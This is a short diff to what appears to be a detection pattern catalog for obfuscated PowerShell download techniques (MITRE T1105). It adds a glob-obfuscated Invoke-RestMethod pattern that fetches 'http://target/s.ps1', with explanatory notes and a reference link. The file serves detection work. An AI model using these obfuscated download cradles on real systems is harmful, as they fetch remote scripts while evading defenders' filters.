@@ -31,7 +31,11 @@ Patterns:
   - Pattern: "& (gcm *-Rest*od) -Uri ..."
     Wildcards: ["*"]
     Notes: "Multiple wildcards with partial matching"
+  - Pattern: "'http://target/s.ps1'|%{(& (gcm I*-R*M*) $_)}"
+    Wildcards: ["*"]
+    Notes: "Pipeline-based IRM invocation: URL piped into ForEach-Object, gcm glob resolves Invoke-RestMethod"
 Resources:
   - https://attack.mitre.org/techniques/T1105/
   - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-restmethod
+  - https://gist.github.com/mgeeky/3b11169ab77a7de354f4111aa2f0df38
 ---
